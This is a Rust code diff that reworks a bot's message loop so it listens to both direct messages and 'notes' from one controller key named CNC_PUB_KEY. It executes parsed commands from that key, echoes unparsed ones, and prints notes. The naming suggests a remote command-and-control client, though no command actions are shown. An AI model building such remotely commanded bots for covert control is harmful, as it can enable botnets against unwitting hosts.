@@ -61,22 +61,29 @@ impl Bot {
             .await?;
 
         let pubkey = PublicKey::parse(CNC_PUB_KEY).unwrap();
-        let mut stream = self.session.receive_msgs(pubkey).await?;
+        let mut msg_stream = self.session.receive_msgs(pubkey).await?;
+        let mut notes_stream = self.session.subscribe_notes(pubkey).await?;
 
-        while let Some(msg) = stream.next().await {
-            if let Some(cmd) = Commands::parse(msg.as_str()) {
-                if self.state.enabled {
-                    cmd.execute(&mut self.state, &self.session).await?
+        loop {
+            tokio::select! {
+                Some(msg) = msg_stream.next() => {
+                    if let Some(cmd) = Commands::parse(msg.as_str()) {
+                        if self.state.enabled {
+                            cmd.execute(&mut self.state, &self.session).await?
+                        }
+                        // only allow enable commands when the bot is disabled
+                        else if let Commands::Enable(_) = cmd {
+                            cmd.execute(&mut self.state, &self.session).await?
+                        }
+                    } else {
+                        self.session.send_msg(msg.as_str(), pubkey).await?;
+                    }
+                },
+                Some(event) = notes_stream.next() => {
+                    // Handle notes_stream similarly if needed
+                    println!("Received note: {}", event.content);
                 }
-                // only allow enable commands when the bot is disabled
-                else if let Commands::Enable(_) = cmd {
-                    cmd.execute(&mut self.state, &self.session).await?
-                }
-            } else {
-                self.session.send_msg(msg.as_str(), pubkey).await?;
             }
         }
-
-        Ok(())
     }
 }
